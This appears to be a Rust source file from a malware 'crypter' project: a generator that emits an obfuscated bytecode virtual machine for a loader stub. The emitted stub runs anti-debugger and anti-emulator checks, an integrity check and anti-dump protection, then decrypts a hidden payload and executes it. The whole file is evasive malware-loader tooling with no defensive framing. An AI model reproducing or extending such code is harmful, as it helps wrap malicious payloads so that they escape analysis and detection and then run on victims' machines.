use crypter_ir::StubProgram;

pub fn emit_vm_fn(
    name: &str,
    program: &[u8],
    gate_fns: &[String],
    dbg_fn: &str,
    emu_fn: &str,
    dec_fn: &str,
    intg_fn: &str,
    exec_fn: &str,
    antidump: &str,
    prog: &StubProgram,
) -> String {
    let mut s = String::new();

    s.push_str(&format!(
        "const VM_PROGRAM: [u8; {}] = [",
        program.len()
    ));
    for (i, b) in program.iter().enumerate() {
        if i > 0 {
            s.push(',');
        }
        s.push_str(&format!("{:#04x}", b));
    }
    s.push_str("];\n\n");

    s.push_str("type GateFn = fn() -> bool;\n");
    s.push_str("static GATE_TABLE: &[GateFn] = &[\n");
    for g in gate_fns {
        s.push_str(&format!("    {} as GateFn,\n", g));
    }
    s.push_str("];\n\n");

    s.push_str(&format!(
        r#"fn {}(dec: fn() -> Option<Vec<u8>>, exec: fn(&[u8]), integ: fn() -> bool, dbg: fn() -> bool, emu: fn() -> bool) {{
    let code = VM_PROGRAM;
    let mut pc = 0usize;
    let mut stack: Vec<i64> = Vec::with_capacity(64);
    let mut payload: Option<Vec<u8>> = None;
    let mut guard_active = false;
    let _anti_dump = {};

    while pc < code.len() {{
        let op = ENC_REVERSE[code[pc] as usize];
        pc += 1;
        match op {{
            0 => {{ if pc + 4 > code.len() {{ break; }} let v = ((code[pc] as u32) << 24 | (code[pc+1] as u32) << 16 | (code[pc+2] as u32) << 8 | (code[pc+3] as u32)) as i64; pc += 4; stack.push(v); }}
            1 => {{ stack.pop(); }}
            2 => {{ if let Some(&v) = stack.last() {{ stack.push(v); }} }}
            3 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(a); stack.push(b); }} }}
            4 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(b.wrapping_add(a)); }} }}
            5 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(b.wrapping_sub(a)); }} }}
            6 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(b ^ a); }} }}
            7 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(b & a); }} }}
            8 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(b | a); }} }}
            9 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(b << (a & 63)); }} }}
            10 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(b >> (a & 63)); }} }}
            11 => {{ if pc + 2 > code.len() {{ break; }} let t = ((code[pc] as u16) << 8 | code[pc+1] as u16) as usize; pc += 2; if t < code.len() {{ pc = t; }} }}
            12 => {{ if stack.pop().unwrap_or(0) == 0 {{ if pc + 2 > code.len() {{ break; }} let t = ((code[pc] as u16) << 8 | code[pc+1] as u16) as usize; pc += 2; if t < code.len() {{ pc = t; }} }} else {{ pc += 2; }} }}
            13 => {{ if stack.pop().unwrap_or(0) != 0 {{ if pc + 2 > code.len() {{ break; }} let t = ((code[pc] as u16) << 8 | code[pc+1] as u16) as usize; pc += 2; if t < code.len() {{ pc = t; }} }} else {{ pc += 2; }} }}
            14 => {{
                if pc >= code.len() {{ break; }}
                let idx = code[pc] as usize;
                pc += 1;
                let ok = if idx < GATE_TABLE.len() {{ GATE_TABLE[idx]() }} else {{ true }};
                if !ok {{ return; }}
            }}
            15 => {{ if dbg() {{ return; }} }}
            16 => {{ if !emu() {{ return; }} }}
            17 => {{ /* key unwrap handled in dec */ }}
            18 => {{
                payload = dec();
                if payload.is_none() {{ return; }}
            }}
            19 => {{ if !integ() {{ return; }} }}
            20 => {{
                if let Some(p) = payload.as_ref() {{
                    if {} {{
                        {}::protect(p);
                        guard_active = true;
                    }}
                }}
            }}
            21 => {{ let _ = guard_active; }}
            22 => {{
                if let Some(p) = payload.as_ref() {{
                    if {} {{ {}::disarm(); }}
                    exec(p.as_slice());
                }}
                return;
            }}
            23 => {{ return; }}
            24 => {{ return; }}
            25 => {{}}
            26 => {{ if let Some(v) = stack.pop() {{ stack.push(!v); }} }}
            27 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(if a == b {{ 1 }} else {{ 0 }}); }} }}
            28 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(if b < a {{ 1 }} else {{ 0 }}); }} }}
            29 => {{ if stack.len() >= 2 {{ let a = stack.pop().unwrap(); let b = stack.pop().unwrap(); stack.push(if b > a {{ 1 }} else {{ 0 }}); }} }}
            _ => {{}}
        }}
    }}
}}

"#,
        name,
        prog.anti_dump,
        prog.anti_dump,
        antidump,
        prog.anti_dump,
        antidump,
    ));

    s
}
